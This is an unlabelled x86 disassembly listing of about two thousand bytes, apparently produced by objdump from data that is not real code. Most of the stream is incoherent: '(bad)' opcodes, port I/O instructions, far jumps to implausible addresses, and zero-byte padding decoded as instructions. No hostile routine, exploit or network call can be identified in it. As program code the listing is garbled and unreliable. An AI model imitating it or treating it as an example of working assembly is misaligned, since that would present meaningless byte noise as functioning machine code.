  43a6a3:	call   0x669af5fb
  43a6a8:	(bad)  
  43a6a9:	popa   
  43a6aa:	add    BYTE PTR [ebp+0x1],dh
  43a6ad:	lds    ebp,FWORD PTR [ecx+0x36]
  43a6b0:	sbb    esp,edx
  43a6b2:	out    0xea,eax
  43a6b4:	push   ss
  43a6b5:	std    
  43a6b6:	(bad)  
  43a6b7:	cmp    al,BYTE PTR [edi]
  43a6b9:	aad    0x5a
  43a6bb:	mov    dh,0x6
  43a6bd:	test   DWORD PTR [eax+eax*1+0x0],ebp
  43a6c1:	add    BYTE PTR [eax],al
  43a6c3:	add    BYTE PTR [ecx+0x21],dl
  43a6c6:	iret   
  43a6c7:	dec    esi
  43a6c8:	add    BYTE PTR [ebp-0x27],0x13
  43a6cc:	lea    ecx,[ebp-0x638d06ce]
  43a6d2:	aas    
  43a6d3:	or     al,0xc8
  43a6d5:	fisttp DWORD PTR [ebx]
  43a6d7:	add    BYTE PTR [ecx],dh
  43a6d9:	in     eax,dx
  43a6da:	inc    edi
  43a6db:	int3   
  43a6dc:	sub    ebp,edx
  43a6de:	inc    edi
  43a6df:	int3   
  43a6e0:	inc    ecx
  43a6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a6e2:	xor    BYTE PTR [ebx-0x2],dl
  43a6e5:	in     al,0x7c
  43a6e7:	in     al,dx
  43a6e8:	pop    ebp
  43a6e9:	mov    ah,0xbe
  43a6eb:	pop    es
  43a6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a6ed:	mov    ah,0xd6
  43a6ef:	adc    ecx,ebx
  43a6f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a6f2:	lods   al,BYTE PTR ds:[esi]
  43a6f3:	pop    es
  43a6f4:	dec    cx
  43a6f6:	retf   0x7b84
  43a6f9:	xlat   BYTE PTR ds:[ebx]
  43a6fa:	mov    esi,0xbee075f8
  43a6ff:	repz je 0x43a71b
  43a702:	std    
  43a703:	(bad)  
  43a704:	clc    
  43a705:	mov    bl,0xc
  43a707:	jge    0x43a706
  43a709:	push   ds
  43a70a:	test   eax,0xffd6ee04
  43a70f:	cld    
  43a710:	ret    
  43a711:	or     ecx,DWORD PTR [eax]
  43a713:	cmp    dl,ch
  43a715:	in     eax,dx
  43a716:	pop    es
  43a717:	test   DWORD PTR [ebx],esi
  43a719:	sub    eax,0x1c6d5286
  43a71e:	inc    edx
  43a71f:	sub    eax,0x53323381
  43a724:	jns    0x43a6ca
  43a726:	mov    edi,0xf
  43a72b:	add    BYTE PTR [eax],al
  43a72d:	retf   
  43a72e:	add    DWORD PTR [edi],esp
  43a730:	add    BYTE PTR [edi-0x9],dl
  43a733:	arpl   WORD PTR [ecx],dx
  43a735:	mov    dl,0x26
  43a737:	out    0x88,eax
  43a739:	sbb    ah,BYTE PTR ds:[eax-0x36]
  43a73d:	sahf   
  43a73e:	jp     0x43a75e
  43a740:	or     dl,dh
  43a742:	mov    esp,0xa368a8e
  43a747:	pusha  
  43a748:	rcr    BYTE PTR [esi+0x9356e82],0xa2
  43a74f:	dec    ebp
  43a750:	std    
  43a751:	out    dx,eax
  43a752:	mov    ah,bh
  43a754:	add    esi,DWORD PTR [ebp+0x2]
  43a757:	xadd   BYTE PTR fs:[ecx-0x65],bh
  43a75c:	lea    ecx,[ecx-0x7a725489]
  43a762:	jnp    0x43a708
  43a764:	xor    edi,eax
  43a766:	add    ah,BYTE PTR [eax-0x40]
  43a769:	inc    edx
  43a76a:	and    BYTE PTR [eax],0xaf
  43a76d:	data16 jns 0x43a7aa
  43a770:	sub    ebp,DWORD PTR [ebp+0x25]
  43a773:	sbb    dh,BYTE PTR [esi]
  43a775:	aaa    
  43a776:	rcl    BYTE PTR [ecx],0x4
  43a779:	test   BYTE PTR [edx-0x75],0xf7
  43a77d:	popf   
  43a77e:	shr    DWORD PTR [ebp-0x40],0x22
  43a782:	jp     0x43a7a3
  43a784:	or     BYTE PTR ds:0xf5457c25,0xa7
  43a78b:	jmp    0x6e263092
  43a790:	inc    BYTE PTR [eax]
  43a792:	add    BYTE PTR [eax],al
  43a794:	add    BYTE PTR [eax],al
  43a796:	jns    0x43a7c2
  43a798:	fnstenv [eax+0x217979]
  43a79e:	call   0x9d4bbdd7
  43a7a3:	and    eax,0xb4f0081c
  43a7a8:	jmp    0x31e9:0xfffa2788
  43a7af:	xlat   BYTE PTR ds:[ebx]
  43a7b0:	or     esi,ebx
  43a7b2:	mov    ecx,edx
  43a7b4:	or     esi,DWORD PTR [edx-0x6]
  43a7b7:	xor    DWORD PTR [ecx+0x3f],ebx
  43a7ba:	int3   
  43a7bb:	jle    0x43a7a0
  43a7bd:	xor    al,0x34
  43a7bf:	inc    ebx
  43a7c0:	inc    ebx
  43a7c1:	xchg   ebp,eax
  43a7c2:	jns    0x43a7c6
  43a7c4:	add    cl,ch
  43a7c6:	dec    ebp
  43a7c7:	cmp    DWORD PTR [ebp+0x37a56924],eax
  43a7cd:	or     al,ah
  43a7cf:	cwde   
  43a7d0:	fcomip st,st(4)
  43a7d2:	(bad)  
  43a7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a7d4:	cmp    al,ch
  43a7d6:	pop    ebx
  43a7d7:	out    0xff,eax
  43a7d9:	call   0xb5abad00
  43a7de:	mov    esp,edi
  43a7e0:	inc    DWORD PTR [eax+0x1c]
  43a7e3:	es stc 
  43a7e5:	jmp    0x6447e5df
  43a7ea:	mov    ecx,0x326208ae
  43a7ef:	cmc    
  43a7f0:	gs call 0xc556d21d
  43a7f6:	pop    ebx
  43a7f7:	out    0xff,eax
  43a7f9:	imul   eax,DWORD PTR [eax],0x0
  43a7ff:	mov    ch,0xfa
  43a801:	test   BYTE PTR [edx+edi*2+0x680fa91a],ah
  43a808:	sub    eax,DWORD PTR [ebp+0x57ed6aac]
  43a80e:	in     eax,dx
  43a80f:	loop   0x43a804
  43a811:	test   BYTE PTR [esi+edi*2-0x5b9daf4c],bl
  43a818:	jg     0x43a7e2
  43a81a:	rol    DWORD PTR [ebp-0x22106d8],1
  43a820:	rcl    BYTE PTR [ebx],0x62
  43a823:	mov    bl,0x2c
  43a825:	xchg   DWORD PTR [ecx],esp
  43a827:	ins    DWORD PTR es:[edi],dx
  43a828:	jg     0x43a82c
  43a82a:	add    BYTE PTR [edi-0x17],cl
  43a82d:	cmc    
  43a82e:	je     0x43a7f7
  43a830:	jns    0x43a878
  43a832:	add    al,0xdf
  43a834:	mov    ebp,0xedc40c2a
  43a839:	dec    esp
  43a83a:	or     al,0x47
  43a83c:	aas    
  43a83d:	add    eax,0xfaf66a8b
  43a842:	into   
  43a843:	iret   
  43a844:	cld    
  43a845:	xor    edi,edi
  43a847:	imul   edi,edx,0x7a1c4582
  43a84d:	dec    eax
  43a84e:	or     BYTE PTR [edi],al
  43a850:	mov    dh,0xe7
  43a852:	dec    edx
  43a853:	add    ch,dh
  43a855:	idiv   BYTE PTR [edx-0x911ee]
  43a85b:	push   ebp
  43a85c:	push   ebx
  43a85d:	add    eax,0xf836d80f
  43a862:	inc    DWORD PTR [eax]
  43a864:	add    BYTE PTR [eax],al
  43a866:	add    BYTE PTR [eax],al
  43a868:	ret    
  43a869:	jp     0x43a8b0
  43a86b:	or     BYTE PTR ds:0xc4cb8437,bl
  43a871:	(bad)  
  43a872:	idiv   edi
  43a874:	xchg   ebx,eax
  43a875:	fcomp  DWORD PTR ds:0xf6ee83ff
  43a87b:	and    eax,0x3ff5dc
  43a880:	xchg   ebx,eax
  43a881:	inc    esp
  43a882:	dec    ebp
  43a883:	push   ss
  43a884:	fdiv   st(7),st
  43a886:	retf   
  43a887:	int3   
  43a888:	jmp    0x43a8bf
  43a88a:	dec    esp
  43a88b:	xor    esi,DWORD PTR [ebx+0x7a]
  43a88e:	inc    esp
  43a88f:	and    al,0x38
  43a891:	sti    
  43a892:	mov    edi,0x8467287d
  43a897:	push   esp
  43a898:	cmp    BYTE PTR [eax],dl
  43a89a:	out    dx,eax
  43a89b:	fmul   DWORD PTR [ebx]
  43a89d:	retf   
  43a89e:	jp     0x43a878
  43a8a0:	or     al,0xa7
  43a8a2:	inc    ebx
  43a8a3:	and    al,0xe8
  43a8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a8a6:	push   ebx
  43a8a7:	and    al,0x75
  43a8a9:	sub    DWORD PTR [edx+0x44],edi
  43a8ac:	cdq    
  43a8ad:	adc    eax,0x4558bffa
  43a8b2:	mov    BYTE PTR [ecx+ebp*1-0x520ef403],0x64
  43a8ba:	dec    edx
  43a8bb:	jge    0x43a85a
  43a8bd:	sbb    DWORD PTR [esp+eax*2-0x6f],edi
  43a8c1:	std    
  43a8c2:	jp     0x43a918
  43a8c4:	pop    ecx
  43a8c5:	add    ecx,edi
  43a8c7:	mov    edi,0x4c7a3120
  43a8cc:	add    BYTE PTR [eax],al
  43a8ce:	add    BYTE PTR [eax],al
  43a8d0:	add    BYTE PTR [ecx+0x31],bl
  43a8d3:	jp     0x43a919
  43a8d5:	push   ecx
  43a8d6:	inc    ebp
  43a8d7:	repnz int 0x8a
  43a8da:	stos   BYTE PTR es:[edi],al
  43a8db:	js     0x43a8b5
  43a8dd:	(bad)  
  43a8de:	aad    0xe7
  43a8e0:	jp     0x8f112190
  43a8e6:	pop    edx
  43a8e7:	jp     0x43a8c1
  43a8e9:	(bad)  
  43a8ea:	push   esp
  43a8eb:	loope  0x43a904
  43a8ed:	(bad)  
  43a8ee:	fs loope 0x43a904
  43a8f1:	out    dx,al
  43a8f2:	pop    esp
  43a8f3:	loope  0x43a904
  43a8f5:	inc    esp
  43a8f6:	rcl    BYTE PTR [edx-0x29],1
  43a8f9:	and    al,0xcf
  43a8fb:	push   edx
  43a8fc:	fdivr  DWORD PTR [esi+0x10]
  43a8ff:	mov    bh,0xf3
  43a901:	dec    edx
  43a902:	jmp    0x1be1:0x7542f078
  43a909:	(bad)  
  43a90a:	lock js 0x43a951
  43a90d:	push   ecx
  43a90e:	xor    DWORD PTR [esi],esi
  43a910:	loop   0x43a988
  43a912:	jmp    0x13e1:0x855e09b1
  43a919:	mov    dh,BYTE PTR [ecx]
  43a91b:	mov    bl,0x0
  43a91d:	dec    esi
  43a91e:	push   ebp
  43a91f:	loope  0x43a930
  43a921:	mov    ebx,DWORD PTR [edx]
  43a923:	mov    edi,0x6e02272c
  43a928:	dec    ecx
  43a929:	cmp    al,0xad
  43a92b:	loope  0x43a967
  43a92d:	ret    
  43a92e:	sub    ch,BYTE PTR [edi+0x2e01cb86]
  43a934:	rol    BYTE PTR [eax],cl
  43a936:	add    BYTE PTR [eax],al
  43a938:	add    BYTE PTR [eax],al
  43a93a:	cmp    eax,0xf803d740
  43a93f:	and    dl,BYTE PTR [edi+edi*2]
  43a942:	fld    DWORD PTR [eax+0x22c1dbc3]
  43a948:	out    0x66,eax
  43a94a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a94b:	cmp    DWORD PTR [esi],esp
  43a94d:	add    al,0xfa
  43a94f:	hlt    
  43a950:	stos   BYTE PTR es:[edi],al
  43a951:	cmp    ebp,DWORD PTR [eax+0x2]
  43a954:	pusha  
  43a955:	sbb    BYTE PTR [ebp-0xdfbd9c7],ch
  43a95b:	add    al,0xab
  43a95d:	cmp    edx,DWORD PTR [eax+0x2]
  43a960:	jo     0x43a95a
  43a962:	retf   0x2639
  43a965:	add    al,0xfa
  43a967:	in     al,0x2a
  43a969:	cmp    edi,DWORD PTR [eax]
  43a96b:	add    cl,cl
  43a96d:	jg     0x43a8f5
  43a96f:	sub    ch,BYTE PTR [edi]
  43a971:	(bad)  
  43a972:	push   0xffffffa8
  43a974:	bound  eax,QWORD PTR [eax]
  43a976:	inc    ecx
  43a977:	dec    ebx
  43a978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a979:	add    edx,edi
  43a97b:	mov    fs,esp
  43a97d:	imul   edi,DWORD PTR ds:0xfea9e6c6,0x7
  43a984:	jnp    0x43a9c1
  43a986:	add    BYTE PTR [edx],0xc1
  43a989:	jg     0x43a921
  43a98b:	push   edx
  43a98c:	das    
  43a98d:	(bad)  
  43a98e:	xor    ch,BYTE PTR [eax+0x4adee06a]
  43a994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a995:	add    eax,DWORD PTR [ecx]
  43a997:	xchg   edx,eax
  43a998:	in     al,0x23
  43a99a:	sub    eax,0x7ee6c6
  43a99f:	add    BYTE PTR [eax],al
  43a9a1:	add    BYTE PTR [eax],al
  43a9a3:	mov    dh,0x2
  43a9a5:	inc    esi
  43a9a6:	push   edi
  43a9a7:	cmp    eax,0x83e8ffc6
  43a9ac:	lds    eax,FWORD PTR [ebx]
  43a9ae:	dec    edx
  43a9af:	scas   al,BYTE PTR es:[edi]
  43a9b0:	dec    edx
  43a9b1:	cmp    eax,0x7c573e9
  43a9b6:	mov    bl,BYTE PTR [ebp+0x61e93d4a]
  43a9bc:	test   eax,esp
  43a9be:	int    0xa4
  43a9c0:	sbb    eax,ecx
  43a9c2:	in     al,dx
  43a9c3:	(bad)  
  43a9c4:	dec    ecx
  43a9c5:	cmp    eax,0xff0277e9
  43a9ca:	call   0x2b0be426
  43a9cf:	jno    0x43aa50
  43a9d1:	fsubr  QWORD PTR [esi-0x1b3dde48]
  43a9d7:	inc    esi
  43a9d8:	inc    ebx
  43a9d9:	cmp    eax,0x59fe9
  43a9de:	test   eax,0xaed4052c
  43a9e3:	mov    eax,0x76e90021
  43a9e8:	add    bl,BYTE PTR [edi-0x20c6d3]
  43a9ee:	pop    edi
  43a9ef:	repnz cmp bh,ah
  43a9f2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a9f4:	or     DWORD PTR [eax+0x29],0x6c882130
  43a9fb:	lds    ebx,FWORD PTR [esi]
  43a9fd:	stc    
  43a9fe:	dec    esi
  43a9ff:	sti    
  43aa00:	and    dl,bh
  43aa02:	fdiv   QWORD PTR [edx+0x11]
  43aa05:	inc    eax
  43aa06:	jmp    0x43aa0b
  43aa0b:	add    dh,ch
  43aa0d:	hlt    
  43aa0e:	dec    ecx
  43aa0f:	test   eax,0x39131b76
  43aa14:	retw   0x90ff
  43aa18:	das    
  43aa19:	add    eax,0xf5642900
  43aa1e:	repz clc 
  43aa20:	and    DWORD PTR ss:[ecx+0xe],ecx
  43aa24:	add    BYTE PTR [edx+0x4dc000f],0xc1
  43aa2b:	ret    
  43aa2c:	pop    eax
  43aa2d:	ret    0xcccb
  43aa30:	loop   0x43a9cf
  43aa32:	inc    ebx
  43aa33:	and    al,0x20
  43aa35:	push   ds
  43aa36:	mov    ecx,0x4b9f8475
  43aa3b:	and    al,0xec
  43aa3d:	popf   
  43aa3e:	inc    ebx
  43aa3f:	and    al,0xd8
  43aa41:	adc    eax,0x9dbdf7cb
  43aa46:	xlat   BYTE PTR ds:[ebx]
  43aa47:	mov    esp,DWORD PTR [eax+0xdf7012a]
  43aa4d:	sahf   
  43aa4e:	out    dx,eax
  43aa4f:	mov    ecx,DWORD PTR [edi]
  43aa51:	fisub  DWORD PTR [ebx+0x24]
  43aa54:	pushf  
  43aa55:	popf   
  43aa56:	(bad)  
  43aa57:	mov    esp,edx
  43aa59:	fldenv [ebx+0x24]
  43aa5c:	lods   al,BYTE PTR ds:[esi]
  43aa5d:	add    eax,0x9f53ebc9
  43aa62:	(bad)  
  43aa63:	mov    ecx,DWORD PTR [eax+0x2a]
  43aa66:	or     DWORD PTR [ebx-0x74fad590],ecx
  43aa6c:	push   eax
  43aa6d:	sub    al,BYTE PTR [ecx]
  43aa6f:	rol    DWORD PTR [eax],1
  43aa71:	add    BYTE PTR [eax],al
  43aa73:	add    BYTE PTR [eax],al
  43aa75:	cmc    
  43aa76:	mov    bl,0xd2
  43aa78:	shl    esi,1
  43aa7a:	mov    bl,0xd7
  43aa7c:	or     esp,DWORD PTR [ebp-0x300812a8]
  43aa82:	sahf   
  43aa83:	out    dx,eax
  43aa84:	div    DWORD PTR [eax]
  43aa86:	sub    BYTE PTR ds:0x439e948b,cl
  43aa8c:	and    al,0x2c
  43aa8e:	fcmovnu st,st(5)
  43aa90:	add    ebp,DWORD PTR [ebp+0x55]
  43aa93:	pop    es
  43aa94:	cmp    esp,eax
  43aa96:	daa    
  43aa97:	add    eax,0x8565477
  43aa9c:	cmp    esp,eax
  43aa9e:	daa    
  43aa9f:	add    DWORD PTR [esi+0x25],esi
  43aaa2:	inc    edx
  43aaa3:	and    al,0x44
  43aaa5:	jne    0x43aaf4
  43aaa7:	or     eax,0x1145c115
  43aaac:	sub    eax,0x23c1352e
  43aab1:	jge    0x43aad7
  43aab3:	shl    DWORD PTR [ebx],1
  43aab5:	jno    0x43aad7
  43aab7:	dec    esp
  43aab8:	icebp  
  43aab9:	sbb    eax,0xfe004aad
  43aabe:	push   ebx
  43aabf:	jne    0x43aa8e
  43aac1:	inc    BYTE PTR [edx+0x75]
  43aac4:	enter  0x6fee,0xca
  43aac8:	mov    ebp,0xcc392985
  43aacd:	sar    esp,0xd2
  43aad0:	mov    ah,0x25
  43aad2:	imul   edi,DWORD PTR [ebp-0x31db3001],0x4e
  43aadc:	add    BYTE PTR [eax],al
  43aade:	(bad)  
  43aadf:	stc    
  43aae0:	inc    ebx
  43aae1:	cmp    eax,0x23bf9475
  43aae6:	jns    0x43aa7a
  43aae8:	mov    ah,0x7
  43aaea:	in     al,dx
  43aaeb:	in     al,dx
  43aaec:	pop    es
  43aaed:	xchg   DWORD PTR [esi],ecx
  43aaef:	cmp    eax,0xe1254ed8
  43aaf4:	retf   0x2c5a
  43aaf7:	in     al,0x3d
  43aaf9:	add    al,0x75
  43aafb:	cwde   
  43aafc:	push   ebx
  43aafd:	mov    ebp,0xcc407da9
  43ab02:	inc    ecx
  43ab03:	aad    0x3f
  43ab05:	int3   
  43ab06:	cmp    ebp,ebp
  43ab08:	aas    
  43ab09:	int3   
  43ab0a:	xor    DWORD PTR [eax+ebp*1+0x74dcee53],esp
  43ab11:	dec    ebx
  43ab12:	jge    0x43aa95
  43ab14:	mov    edi,0xa3297555
  43ab19:	ss je  0x43ab79
  43ab1c:	add    DWORD PTR ds:0x853e8e35,ebp
  43ab22:	mov    ah,0x2
  43ab24:	jecxz  0x43ab28
  43ab26:	jmp    0xe702:0xb7d3df80
  43ab2d:	mov    eax,0x6d34d30d
  43ab32:	js     0x43ab35
  43ab34:	out    0x3,eax
  43ab36:	xchg   edi,eax
  43ab37:	fldcw  WORD PTR [esi+0x25766c0b]
  43ab3d:	jnp    0x43aafa
  43ab3f:	mov    esp,0x4025
  43ab44:	add    BYTE PTR [eax],al
  43ab46:	add    cl,al
  43ab48:	dec    ebp
  43ab49:	mov    bl,0x3f
  43ab4b:	mov    ecx,0xb13fab4d
  43ab50:	dec    ebp
  43ab51:	pop    esi
  43ab52:	cs inc esi
  43ab54:	mov    edi,DWORD PTR [ebx+0x6e0a367a]
  43ab5a:	mov    ebx,0xfeaf038e
  43ab5f:	add    eax,0x24d2dac1
  43ab64:	(bad)  
  43ab66:	mov    ah,0x74
  43ab68:	shl    DWORD PTR [esi+edx*8+0xbeec5ff],cl
  43ab6f:	not    BYTE PTR [edi]
  43ab71:	sbb    DWORD PTR [ebx],ecx
  43ab73:	lock pushf 
  43ab75:	fidivr DWORD PTR [edx+0x3d]
  43ab78:	push   cs
  43ab79:	mov    esi,0x6e091b2c
  43ab7e:	retf   
  43ab7f:	jp     0x43ab84
  43ab81:	nop
  43ab82:	jmp    0x42f1:0xc1dc9381
  43ab89:	por    mm0,QWORD PTR [ecx+edx*4+0x4e]
  43ab8e:	repnz and bh,BYTE PTR [esi+0x41bfcab0]
  43ab95:	mov    ebp,0xbb32dafb
  43ab9a:	ret    0x264a
  43ab9d:	push   ebx
  43ab9e:	add    esi,DWORD PTR [ebp+0x2]
  43aba1:	add    BYTE PTR [edx+0xd],ch
  43aba4:	sbb    al,BYTE PTR [eax]
  43aba6:	outs   dx,DWORD PTR ds:[esi]
  43aba7:	jbe    0x43abab
  43aba9:	inc    eax
  43abaa:	jmp    0x43abaf
  43abaf:	add    BYTE PTR [eax+0x26],al
  43abb2:	pop    edi
  43abb3:	push   ds
  43abb4:	push   ebx
  43abb5:	sbb    edx,DWORD PTR [edi+0x6c]
  43abb8:	mov    dh,0x96
  43abba:	cmp    ah,BYTE PTR [edx+0x3d]
  43abbd:	push   es
  43abbe:	and    eax,0xe7b4262f
  43abc3:	pop    ecx
  43abc4:	push   ebx
  43abc5:	sbb    edi,ecx
  43abc7:	nop
  43abc8:	sub    DWORD PTR [ecx-0x79308a40],eax
  43abce:	inc    eax
  43abcf:	or     eax,0xd6192a36
  43abd4:	dec    ecx
  43abd5:	lahf   
  43abd6:	fucomip st,st(0)
  43abd8:	xor    ecx,eax
  43abda:	sti    
  43abdb:	iret   
  43abdc:	mov    al,ds:0xd1d2f91b
  43abe1:	xchg   BYTE PTR [ebx-0x33],al
  43abe4:	cmp    al,0x2
  43abe6:	test   ecx,ebp
  43abe8:	lds    eax,FWORD PTR [ebx+edi*1-0x1c]
  43abec:	jbe    0x43abf0
  43abee:	shl    dh,0x2
  43abf1:	pop    esi
  43abf2:	test   DWORD PTR [eax-0x7e9c78cc],ebp
  43abf8:	xor    cl,al
  43abfa:	sti    
  43abfb:	(bad)  
  43abfc:	pusha  
  43abfd:	sbb    edi,ecx
  43abff:	mov    edx,0xe9762a36
  43ac04:	jbe    0x43ac08
  43ac06:	mov    ebp,0x7e1ad62
  43ac0b:	bound  esi,QWORD PTR ds:0xaef20fe1
  43ac11:	xchg   DWORD PTR [ebp+eax*1+0x0],ecx
  43ac15:	add    BYTE PTR [eax],al
  43ac17:	add    BYTE PTR [eax],al
  43ac19:	jne    0x43abac
  43ac1b:	push   es
  43ac1c:	bound  ebp,QWORD PTR ds:0x965603e1
  43ac22:	pop    esp
  43ac23:	adc    BYTE PTR [eax],al
  43ac25:	pop    esp
  43ac26:	xor    dh,al
  43ac28:	loope  0x43abf1
  43ac2a:	into   
  43ac2b:	add    BYTE PTR [eax+ebp*2+0x1e],0xf0
  43ac30:	fs js  0x43ac2d
  43ac33:	cli    
  43ac34:	xlat   BYTE PTR ds:[ebx]
  43ac35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ac36:	dec    edx
  43ac37:	sbb    eax,0xfae18b08
  43ac3c:	shl    bh,cl
  43ac3e:	ret    0xf
  43ac41:	hlt    
  43ac42:	retf   
  43ac43:	push   0x43
  43ac45:	sbb    al,0x65
  43ac47:	clc    
  43ac48:	xor    eax,0x10c
  43ac4d:	xchg   edi,eax
  43ac4e:	dec    edx
  43ac4f:	sbb    eax,0x1d625510
  43ac54:	adc    BYTE PTR [ecx+0x7d],ah
  43ac57:	sbb    eax,0x4ae68710
  43ac5c:	push   esi
  43ac5d:	fwait
  43ac5e:	mov    eax,ds:0x69fc043
  43ac63:	sub    DWORD PTR [ebp-0x50],eax
  43ac66:	adc    DWORD PTR [esi-0x1e9bbab0],edi
  43ac6c:	(bad)  
  43ac6d:	jns    0x43ac5d
  43ac6f:	add    BYTE PTR [ebp-0x20],0xc5
  43ac73:	cmp    al,0xfc
  43ac75:	shr    ch,cl
  43ac77:	idiv   bh
  43ac79:	and    eax,0x8df144
  43ac7e:	add    BYTE PTR [eax],al
  43ac80:	add    BYTE PTR [eax],al
  43ac82:	dec    ecx
  43ac83:	(bad)  
  43ac84:	arpl   WORD PTR [ebx+0x9c],sp
  43ac8a:	fistp  WORD PTR [ecx-0x66870fbc]
  43ac90:	add    al,0x0
  43ac92:	mov    WORD PTR [eax],es
  43ac94:	add    BYTE PTR [ecx-0x7d],bl
  43ac97:	dec    ebp
  43ac98:	push   edi
  43ac99:	pop    ebx
  43ac9a:	out    0xe4,eax
  43ac9c:	push   esp
  43ac9d:	push   ecx
  43ac9e:	(bad)  
  43ac9f:	call   0xf918:0xa07555f6
  43aca6:	enter  0x2c15,0x73
  43acaa:	les    esi,FWORD PTR gs:[ecx-0xaa8bdf5]
  43acb1:	addr16 xor eax,0x9affc043
  43acb7:	gs cmp eax,0xaff1753d
  43acbd:	cmc    
  43acbe:	and    bh,ch
  43acc0:	jg     0x43ac86
  43acc2:	jge    0x43ad1a
  43acc4:	inc    eax
  43acc5:	stc    
  43acc6:	pop    eax
  43acc7:	icebp  
  43acc8:	or     eax,0x3e907540
  43accd:	mov    ebp,0xfffd29e5
  43acd2:	jne    0x43ad4c
  43acd4:	rol    DWORD PTR [ecx+edi*1-0x4afafabb],cl
  43acdb:	mov    esi,0x531850b
  43ace0:	adc    BYTE PTR [ebp+0x2d140d31],al
  43ace6:	add    BYTE PTR [eax],al
  43ace8:	add    BYTE PTR [eax],al
  43acea:	add    BYTE PTR [edi-0x527acccc],ah
  43acf0:	nop
  43acf1:	mov    edi,0x33547123
  43acf6:	test   DWORD PTR [esi-0x427b3cc0],esp
  43acfc:	mov    al,ds:0x908123c7
  43ad01:	iret   
  43ad02:	and    eax,DWORD PTR [ebp+0x6923bf90]
  43ad08:	pop    edx
  43ad09:	sbb    ecx,edi
  43ad0b:	scas   al,BYTE PTR es:[edi]
  43ad0c:	pop    edx
  43ad0d:	sbb    cl,bh
  43ad0f:	lods   eax,DWORD PTR ds:[esi]
  43ad10:	adc    BYTE PTR [ebx+esi*2],bh
  43ad13:	mov    DWORD PTR [eax+esi*1-0x60637a7b],edx
  43ad1a:	and    ecx,DWORD PTR [ebp-0x4e7ac460]
  43ad20:	add    cl,BYTE PTR [ebx]
  43ad22:	adc    BYTE PTR [esp-0x1a],ah
  43ad26:	push   esp
  43ad27:	retf   
  43ad28:	or     al,0xe
  43ad2a:	rcl    BYTE PTR [esi-0x27042e0e],1
  43ad30:	add    edi,esi
  43ad32:	mov    edi,0x4b10e96
  43ad37:	scas   eax,DWORD PTR es:[edi]
  43ad38:	iret   
  43ad39:	adc    al,0x7f
  43ad3b:	aaa    
  43ad3c:	mov    esp,0x285458d
  43ad41:	(bad)  
  43ad42:	aas    
  43ad43:	test   eax,0xfb9fe6bf
  43ad48:	add    edi,esp
  43ad4a:	add    esi,DWORD PTR [ebp-0x4e]
  43ad4d:	pop    ebp
  43ad4e:	rol    BYTE PTR [eax],0x0
  43ad51:	add    BYTE PTR [eax],al
  43ad53:	add    BYTE PTR [esi-0xe],dl
  43ad56:	outs   dx,DWORD PTR ds:[esi]
  43ad57:	cwde   
  43ad58:	push   esi
  43ad59:	repnz imul ebx,DWORD PTR [eax+0x23bdf256],0x40
  43ad61:	mov    ah,0x91
  43ad63:	jle    0x43ad9b
  43ad65:	sbb    dh,BYTE PTR [eax-0x60]
  43ad68:	fidiv  DWORD PTR [ecx+0x42dec06d]
  43ad6e:	sub    al,0x28
  43ad70:	int3   
  43ad71:	sbb    cl,dl
  43ad73:	sub    dh,dl
  43ad75:	les    edi,FWORD PTR [esi+0x43123678]
  43ad7b:	addr16 jne 0x43ad80
  43ad7e:	out    0x3,eax
  43ad80:	lock xchg BYTE PTR [esp+esi*1],bl
  43ad84:	adc    DWORD PTR [ecx+0x27503f4],ecx
  43ad8a:	out    0xcc,eax
  43ad8c:	cmp    eax,0x423d2dbc
  43ad91:	aas    
  43ad92:	mov    ah,al
  43ad94:	or     dh,ah
  43ad96:	es add al,0xb1
  43ad99:	dec    ebp
  43ad9a:	stos   DWORD PTR es:[edi],eax
  43ad9b:	aaa    
  43ad9c:	test   eax,0x9f77004d
  43ada1:	sbb    edi,ecx
  43ada3:	jmp    0x4143b01e
  43ada8:	(bad)  
  43ada9:	sbb    edi,ecx
  43adab:	jmp    0x5743b026
  43adb0:	lahf   
  43adb1:	sbb    edi,ecx
  43adb3:	add    eax,DWORD PTR [edx]
  43adb5:	xlat   BYTE PTR ds:[ebx]
  43adb6:	inc    DWORD PTR [esi]
  43adb8:	add    BYTE PTR [eax],al
  43adba:	add    BYTE PTR [eax],al
  43adbc:	add    BYTE PTR [edx],cl
  43adbe:	xlat   BYTE PTR ds:[ebx]
  43adbf:	(bad)  
  43adc0:	call   0x3643b03b
  43adc5:	pop    edi
  43adc6:	sbb    edi,ecx
  43adc8:	pop    ebx
  43adc9:	push   ds
  43adca:	fdivr  st,st(7)
  43adcc:	jle    0x43addc
  43adce:	fdivr  st,st(7)
  43add0:	call   0x1643b04b
  43add5:	pop    edi
  43add6:	sbb    edi,ecx
  43add8:	retf   0xd98b
  43addb:	dec    ebp
  43addd:	sbb    ecx,0xffffffff
  43ade0:	call   0xf643b05b
  43ade5:	pushf  
  43ade6:	sbb    edi,ecx
  43ade8:	sbb    ebp,DWORD PTR [eax-0x27]
  43adeb:	(bad)  
  43adec:	mov    esi,0xe8ffd963
  43adf1:	jbe    0x43adf5
  43adf3:	add    dh,dl
  43adf5:	pushf  
  43adf6:	sbb    edi,ecx
  43adf8:	ja     0x43ae45
  43adfa:	fcos   
  43adfc:	bound  eax,QWORD PTR [ebx-0x27]
  43adff:	(bad)  
  43ae00:	call   0xb643b07b
  43ae05:	pop    esp
  43ae06:	sbb    edi,ecx
  43ae08:	jbe    0x43ae38
  43ae0a:	fcos   
  43ae0c:	popa   
  43ae0d:	push   ds
  43ae0e:	fcos   
  43ae10:	call   0x9643b08b
  43ae15:	pop    esp
  43ae16:	sbb    edi,ecx
  43ae18:	add    BYTE PTR [esi],cl
  43ae1a:	fcos   
  43ae1c:	jmp    FWORD PTR [ecx-0x63]
  43ae1f:	cmp    BYTE PTR [eax],al
  43ae21:	add    BYTE PTR [eax],al
  43ae23:	add    BYTE PTR [eax],al
  43ae25:	add    BYTE PTR [ebp+eax*1-0x14150000],cl
  43ae2c:	idiv   bh
